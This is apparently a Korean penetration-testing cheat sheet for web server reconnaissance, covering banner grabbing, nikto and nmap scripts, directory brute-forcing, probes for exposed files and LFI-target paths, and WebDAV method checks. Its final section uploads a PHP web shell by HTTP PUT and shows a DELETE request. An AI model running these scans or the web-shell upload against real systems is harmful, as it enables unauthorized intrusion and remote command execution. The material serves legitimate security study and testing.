## 배너 및 버전 확인

```bash
# HTTP 헤더에서 버전 추출
curl -I http://<IP>
curl -sv http://<IP> 2>&1 | grep -i "server\|x-powered"
curl -s -I http://<IP> | grep -i server

# whatweb — 기술 스택 전체 파악
whatweb http://<IP>
whatweb -v http://<IP>        # 상세
whatweb -a 3 http://<IP>      # 공격적 스캔

# nikto — 설정 오류, 취약점 자동 탐지
nikto -h http://<IP> -o nikto.txt
nikto -h http://<IP> -ssl             # HTTPS
nikto -h http://<IP> -p 8080          # 비표준 포트
nikto -h http://<IP> -Tuning 4        # XSS 위주
```

## nmap NSE

```bash
# 기본 웹 스크립트
nmap -p 80,443,8080,8443 \
  --script=http-enum,http-headers,http-methods,http-title,http-server-header \
  <IP>

# 특정 스크립트
nmap -p 80 --script http-enum <IP>              # 디렉터리 탐색
nmap -p 80 --script http-shellshock <IP>        # ShellShock
nmap -p 80 --script http-methods <IP>           # PUT/DELETE 등 허용 메서드
nmap -p 80 --script http-auth-finder <IP>       # 인증 방식
nmap -p 80 --script http-default-accounts <IP>  # 기본 자격증명
nmap -p 80 --script http-wordpress-enum <IP>    # WordPress 감지
nmap -p 80 --script http-php-version <IP>       # PHP 버전
```

## 디렉터리 탐색

```bash
# gobuster
gobuster dir -u http://<IP> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,old,zip -t 50

# feroxbuster (재귀)
feroxbuster -u http://<IP> \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt -t 50

# CGI 전용 탐색 (ShellShock 가능성)
gobuster dir -u http://<IP>/cgi-bin/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x sh,cgi,pl,py,rb -t 30
```

## 유용한 경로 직접 확인

```bash
# 정보 노출 파일
curl http://<IP>/robots.txt
curl http://<IP>/sitemap.xml
curl http://<IP>/.htaccess
curl http://<IP>/phpinfo.php
curl http://<IP>/info.php
curl http://<IP>/test.php

# Apache 상태 페이지 (노출되면 내부 정보 획득)
curl http://<IP>/server-status
curl http://<IP>/server-info

# 설정 파일 (LFI 가능 시)
# Debian/Ubuntu
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/var/log/apache2/access.log
/var/log/apache2/error.log

# RHEL/CentOS
/etc/httpd/conf/httpd.conf
/var/log/httpd/access_log
/var/log/httpd/error_log
```

## HTTP 메서드 확인 (WebDAV)

```bash
# 허용된 메서드 확인
curl -X OPTIONS http://<IP>/ -v 2>&1 | grep "Allow:"

# PUT이 허용되면 파일 업로드 가능
curl -X PUT http://<IP>/shell.php -d '<?php system($_GET["cmd"]); ?>'

# DELETE
curl -X DELETE http://<IP>/file.php
```
